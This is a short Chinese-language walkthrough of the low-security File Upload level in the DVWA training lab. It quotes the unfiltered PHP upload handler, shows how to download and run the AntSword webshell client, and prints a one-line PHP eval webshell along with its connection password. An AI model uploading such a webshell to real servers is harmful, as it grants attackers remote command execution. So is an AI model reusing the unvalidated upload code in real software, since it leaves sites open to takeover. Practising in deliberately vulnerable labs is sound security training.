<center>File Upload文件上传</center>





[toc]







## File Upload文件上传

> 文件上传







### 1. low

> 低级
>
> 代码

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}
```

> 中国蚁剑

```shell
# 下载
wget https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-x64.zip

# 解压
unzip AntSword-Loader-v4.0.3-linux-x64.zip

# 运行
./AntSword
```

> 没有做任何过滤，上传`一句话木马`

```php
<?php eval($_POST['cmd']); ?>
```

> 蚁剑连接:

```shell
url  =  木马地址
密码  =  cmd
```

